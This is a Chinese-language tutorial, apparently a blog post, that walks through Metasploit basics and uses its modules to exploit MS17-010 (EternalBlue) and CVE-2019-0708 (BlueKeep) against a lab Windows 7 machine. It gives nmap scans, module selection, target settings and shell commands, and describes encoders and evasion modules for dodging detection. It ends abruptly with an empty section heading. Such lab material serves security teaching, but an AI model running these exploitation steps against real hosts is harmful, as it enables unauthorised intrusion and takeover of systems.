# 一.msf(美少妇)测试！

## 1.讲解msf基本命令

### 1.1首先打开kali终端授权，启动msf

```
(root💀kali)-[~]
└─# msfconsole 
```

![image-20220715200626903](https://i0.hdslb.com/bfs/album/7e1b07cf63383ee8d9bc66daadd8900f5862939b.png)

打开页面（觉得不好看可以输入banner切换美丽图案！）

### 1.2查看版本信息（注意是在终端打开，不是软件里！不是软件里！不是软件里！）

```
┌──(root💀kali)-[~]
└─# msfconsole -v   
Framework Version: 6.1.14-dev
```

### 1.3简约打开

```
┌──(root💀kali)-[~]
└─# msfconsole -q
```

### 1.4退出msf

```
msf6 > exit
```

![image-20220715201238025](https://i0.hdslb.com/bfs/album/95578b5cdabb2796b4b1b0c357f4e0e202e7c371.png)

## 2.复现ms17-010(永恒之蓝)漏洞

### 2.1首先建立win7虚拟机

因为win7存在永恒之蓝漏洞，我们先把kali和win7都采取桥接模式，彼此才能联系，获取win7ip地址（192.168.110.201）

![image-20220715203721473](https://i0.hdslb.com/bfs/album/27beb4a55f714b759d8c2c5ab8d8527454e061fb.png)

### 2.2开启kali虚拟机打开终端打开msf

```
msfconsole 
```

![image-20220715202151205](https://i0.hdslb.com/bfs/album/aeef5d4af17a6dd98fcf912ccc9ea644cd286927.png)

### 2.3使用nmap进行端口测试，看完括号里再行动（win7防火墙一定要关闭，要不然连不上！！！）

![image-20220715203351126](https://i0.hdslb.com/bfs/album/486b3e39bfe7bb1753f8053782f97b121160f2e1.png)

看吧，连不上！

![image-20220715203829188](https://i0.hdslb.com/bfs/album/e09569bd1a76573b98b90277d94505c65d88d420.png)

上面箭头有down就是没打开，下面open就是打开了。

### 2.4打开msf

```
search ms17-010
```

![image-20220715204634733](https://i0.hdslb.com/bfs/album/2a691d954ebab9a8caf2636c5b116d865d89bd46.png)

### 2.5先嗅探目标（win7),我们这里使用第三个去嗅探

```
use 3
```

![image-20220715204904467](https://i0.hdslb.com/bfs/album/a792df2da651ff0a12af0c133ab49a06ae8763f0.png)

### 2.6使用options填写相关信息，yes必填，no不用填写，而发现yes前面缺少相关信息，

```
options
```

![image-20220715205131813](https://i0.hdslb.com/bfs/album/b83e435d5d1648dcfc534b9b8695d7ffa1a76ab3.png)

### 2.7补全相关信息（RHOSTS可以小写不影响）

```
set RHOSTS 192.168.110.201
```

![image-20220715205442067](https://i0.hdslb.com/bfs/album/4a3325d21f02446023d3352cbd4efeee8b515cf9.png)

### 2.8开始使用exp  (  use  大写不行)

```
use 0
```

![image-20220715205807821](https://i0.hdslb.com/bfs/album/70848db6895f86e60221fd29ba903910ecd97a93.png)

继续打开options检查

![image-20220715205900012](https://i0.hdslb.com/bfs/album/815b3dee85d78cbd2f3c8971a93076c8a971f85b.png)

老规矩，我们补充上

![image-20220715205938738](https://i0.hdslb.com/bfs/album/a90776a87ca01d6bd4fd78d54f812c39dd063c27.png)

### 2.9开始进攻（run）

```
run
```

![image-20220715210047840](https://i0.hdslb.com/bfs/album/59a209692f53472ea97c8760f98b3277fa9c1b3b.png)

显示这个就是对方根据地！

### 2.10执行命令测试！

我们输入相关命令，创建文件夹进行测试.

![image-20220715210544926](https://i0.hdslb.com/bfs/album/ed8f80668d0e73054c3d340347289f41ce3cf5a3.png)

![image-20220715210627811](https://i0.hdslb.com/bfs/album/c38e7999b5ffa72733b34843ec7fcc31e65473e8.png)

拿下，拿下！

### 2.11可以用exit命令进行退出

```
exit
```

![image-20220715210814903](https://i0.hdslb.com/bfs/album/1f41f11287da67047b2b2620535b7e4e6fb4b84b.png)

## 3.msf基础知识

### 3.1msf常用命令合集

```
msf6 > use 2                         **search 找到模块后，用 use 使用模块**
msf6 > search ms17-010            搜索模块，**例：seach ms17-010**
msf6 > banner                       查看当前msf的版本信息和模块数量
msf6 > help                      当你刚进入msf终端时，不知道有哪些命令可以使用，那么你可以用`help/?`命令查看msf的命令都有哪些,以及解释
msf6 > ?                           功能和help一样
sessions                          #sessions –h 查看帮助
sessions -i <ID值>         #进入会话   -k  杀死会话
back                               #返回上一步
run/exploit                     #执行已有的模块，输入run后按两下tab，列出已有的脚本   -j , 后台运行
info                                 #查看已有模块信息
load                                #加载插件
jobs                                #显示和管理作业 
kill                                  # 杀死一个job  , kill 0
nmap                             # msf控制台内置的有nmap工具
```



### 3.2**技术功能模块分类** 

1、`Auxiliary`  负责执行信息收集、扫描、嗅探、指纹识别、口令猜测和 Dos 攻击等功能的辅助模块 

2、`Exploits`   主要包含了传说中的exp , 各种漏洞利用的脚本。主要的攻击代码全在这里

​                   利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动） 

3、`Payloads`  这个单词翻译过来叫载荷：是攻击者发送给目标系统执行的指令（不包含exploits攻击阶段），

`payloads主要是在目标主机执行的`，而`exploits是在本地机执行`作用于目标机。

payload 分为 3 种类型 ，分别是 singles、stages 和 stagers。shellcode 是特殊的 payload，用于拿shell

- singles：all-in-one。完整的 payload，这些 payload 都是一体化的，不需要依赖外部的库和包。

- stagers：目标计算机内存有限时，先传输一个较小的 payload 用于建立连接 

- stages：利用 stagers 建立的连接下载后续 payload

4、`Encoders`  各种编码工具 , 对 payload 进行加密 , 用于躲过入侵检测和过滤系统

5、`Nops`    NOP (No Operation or Next Operation) sled,由于IDS/IPS会检查数据包中不规则的数据，所以在

某些场合下(比如针对溢出攻击),某些特殊的滑行字符串(NOPS x90x90...)则会因为被拦截而导致攻击失效，所以此

时需要修改exploit中的NOPs.nops文件夹下的东西会在payload生成时用到(后面会有介绍)。比如我们打开php的

NOPS生成脚本，就会发现它只是返回了指定长度的空格而已。（不理解没关系）

6、`Post`  这个目录里放着msf 的exploits执行成功后，`向目标机发送的一些功能性指令`比如：`提权`，获取hash等 

7、`Evasion` msf中的混淆模块 , 更新了后  自带windows denfender的混淆 , 效果一般 早不免杀了 , 总比没有好  自己配合其他手段免杀

# 二.CVE-2019-0708漏洞复现

## 1.win7肉鸡

防火墙关闭 , 开启远程链接 , 即3389端口，探测目标是否开启对应的端口 , 即3389

```
nmap -sS -p 3389 192.168.1.110
```

![image-20220716100220928](https://i0.hdslb.com/bfs/album/948ffd16b2b96e254a930ee00ef4da9e6c9ab16e.png)



## 2.使用msf嗅探模块 , 探测是否有漏洞

```
search cve-2019-0708
use 0
show options
```

![image-20220716100640626](https://i0.hdslb.com/bfs/album/425986fc51b355146a13e5837fc64fe85cf6e892.png)

![image-20220716100724388](https://i0.hdslb.com/bfs/album/4907d41325bb9978e1ccfbf0834a24033f95e28f.png)

![image-20220716100839266](https://i0.hdslb.com/bfs/album/e9f95f0b969ef49851007cb29b59f38b11b28f2a.png)

## 3.设置rhosts

```
set rhosts 192.168.1.110     # 直接接收ip , 如果想要批量检测  file:/文件路径/文件名
run
```

![image-20220716100917934](https://i0.hdslb.com/bfs/album/e693281201176c0e0b86cda2a14e4e2d73ac3278.png)

## 4.说明存在漏洞，搜索cve-2019-0708  选择相应漏洞利用模块

```
search cve-2019-0708
use 1
```

![image-20220716101032795](https://i0.hdslb.com/bfs/album/eaa74b05a5a50f1b0141920751fa8d642790002b.png)

![image-20220716101109450](https://i0.hdslb.com/bfs/album/3f5124a0b062bbed421c096db266af8bb6195bc4.png)



## 5.显示选项  显示targets

```
show options
show targets
```

![image-20220716101141240](https://i0.hdslb.com/bfs/album/99ec7ac10ce0323126508d7394250feb7e9de881.png)



## 6.设置options和targets

```
set rhosts 192.168.1.110
set target 4
```

![image-20220716101521104](https://i0.hdslb.com/bfs/album/71835c8a184e00912fb30e59e4ba2bf80ce8373b.png)



![image-20220716101448519](https://i0.hdslb.com/bfs/album/68db1e9439765f9bfce13e44c6fdfd6177cad69a.png)

## 7.开始攻击，拿到shell

```
run
shell
```

![image-20220716101553970](https://i0.hdslb.com/bfs/album/70203967b3a3d5a4159fd064b115d67760985b7b.png)





## 8.执行命令测试

```
shell
cd C:\
echo > daociyiyou.txt / 或者创建一个系统用户加入管理员组

# 退出 
exit 
```



## 9.查看win7肉鸡